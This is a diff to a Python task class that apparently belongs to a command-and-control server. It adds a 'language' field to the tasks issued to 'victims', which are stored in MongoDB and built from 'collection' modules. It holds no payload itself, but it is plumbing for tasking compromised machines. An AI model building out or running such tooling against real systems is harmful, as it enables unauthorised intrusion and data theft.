@@ -10,7 +10,7 @@ class Task:
 	tasks = {}
 	databasename = os.environ['MONGODB_DATABASE']
 
-	def __init__(self,victim_id,command,options,task_id,output=None,issued=False,add_db=True):
+	def __init__(self,victim_id,command,language,options,task_id,output=None,issued=False,add_db=True):
 
 		self.task_id = task_id
 		self.victim_id = victim_id
@@ -18,6 +18,7 @@ class Task:
 		self.output = output
 		self.issued = issued
 		self.options = options
+		self.language = language
 		self.tasks[self.task_id] = self
 
 		if add_db : self.insert_cmd_db()
@@ -37,7 +38,7 @@ class Task:
 	@classmethod
 	def load_task(cls,task):
 		
-		task_obj = Task(victim_id = task['victim_id'], command = task['command'], options = task['options'] , task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
+		task_obj = Task(victim_id = task['victim_id'], command = task['command'], language= task['language'], options = task['options'] , task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
 		
 		cls.tasks[task_obj.task_id] = task_obj
 
@@ -67,7 +68,7 @@ class Task:
 
 	## Creates an object of the respective Module Class, loads in dict and returns needed info to be sent by server
 	def issue_dict(self):
-		language = 'python'
+		language = self.language
 		utility = 'collection'
 
 		module_folder = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",utility)
@@ -105,6 +106,6 @@ class Task:
 		mydb = self.mongoclient[self.databasename]
 		tasks = mydb["tasks"]
 
-		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'options':self.options, 'output':self.output ,'issued': self.issued}
+		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'language':self.language, 'options':self.options, 'output':self.output ,'issued': self.issued}
 
 		tasks.insert_one(h)
